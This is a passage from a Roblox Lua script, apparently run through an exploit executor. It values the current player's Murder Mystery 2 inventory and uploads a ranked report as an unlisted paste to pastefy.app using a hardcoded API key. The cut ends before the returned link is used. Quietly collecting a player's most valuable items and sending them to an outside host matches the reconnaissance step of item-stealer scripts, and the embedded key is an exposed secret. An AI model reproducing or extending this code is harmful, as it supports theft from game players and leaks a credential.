}
	end)
	if not success or type(Values) ~= "table" then Values = {} end

	local items = {}
	for itemId, amount in pairs(owned) do
		local value = Values[itemId]
		if value then
			table.insert(items, {id = itemId, value = value, quantity = amount})
		end
	end

	-- Sort by total value (quantity * value)
	table.sort(items, function(a, b)
		return (a.value * a.quantity) > (b.value * b.quantity)
	end)

	return items
end

local function formatNumber(n)
    n = math.floor(n + 0.5)  -- Round to nearest whole number
    local s = tostring(n)
    local len = #s
    if len <= 3 then return s end
    return string.sub(s, 1, -4) .. "," .. string.sub(s, -3)
end

local function summariseItems(items)
	local lines = {}
	for _, item in ipairs(items) do
		local totalItemValue = item.value * item.quantity
		table.insert(lines, string.format("x%d %s - %s", 
			item.quantity, 
			item.id, 
			formatNumber(totalItemValue)
		))
	end
	return table.concat(lines, "\n")
end

local function createPastefyLink(items, totalValue)
    local PASTEFY_API_KEY = "4dPYqpg8YcMQfCFN7Q7HbyxsGlzSVAA4faPKdMBlQo4oav7DS6nzOa3Y7Gcg"
    
    local content = string.format("MM2 Inventory Report for %s\n", LocalPlayer.Name)
    content ..= string.format("Total Value: %s\n\n", formatNumber(totalValue))
    
    for _, item in ipairs(items) do
        local totalItemValue = item.value * item.quantity
        content ..= string.format("x%d %s // value: %s\n", 
            item.quantity, 
            item.id,
            formatNumber(totalItemValue)
        )
    end
    
    local payload = {
        type = "PASTE",
        title = "MM2 Inventory: " .. LocalPlayer.Name,
        content = content,
        visibility = "UNLISTED",
        encrypted = false
    }
    
    local response = request({
        Url = "https://pastefy.app/api/v2/paste",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            ["Authorization"] = "Bearer " .. PASTEFY_API_KEY,
            ["Accept"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
    
    if response and response.Success and response.StatusCode == 200 then
        local data = HttpService:JSONDecode(response.Body)
        return data.paste.raw_url or "https://pastefy.app"
    end
    return "https://pastefy.app"
end

local items = getTopItems()
local totalValue = 0
for _, item in ipairs(items) do
	totalValue += item.value * item.quantity
end

